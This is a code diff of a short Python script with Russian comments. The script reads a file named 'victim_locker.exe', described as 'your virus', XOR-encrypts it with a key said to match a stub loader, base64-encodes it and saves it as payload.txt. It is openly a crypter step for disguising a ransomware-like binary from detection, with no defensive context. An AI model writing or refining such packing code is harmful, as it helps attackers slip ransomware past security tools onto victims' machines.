@@ -1,22 +1,15 @@
-import os
 import base64
-from cryptography.fernet import Fernet
 
-# Генерируем ключ
-key = Fernet.generate_key()
-cipher = Fernet(key)
-
-# Читаем наш вирус
+# Читаем твой вирус
 with open("victim_locker.exe", "rb") as f:
     data = f.read()
 
-# Шифруем
-encrypted = cipher.encrypt(data)
+# Шифруем простым XOR (тот же ключ, что в stub.py)
+key = 0xAA
+encrypted = bytes([b ^ key for b in data])
 
-# Сохраняем ключ в файл (чтобы ты знал)
-with open("key.txt", "wb") as f:
-    f.write(key)
-
-# Сохраняем зашифрованный файл
-with open("encrypted.bin", "wb") as f:
+# Переводим в Base64 и сохраняем как текстовый файл
+with open("payload.txt", "wb") as f:
     f.write(base64.b64encode(encrypted))
+
+print("Файл payload.txt создан!")
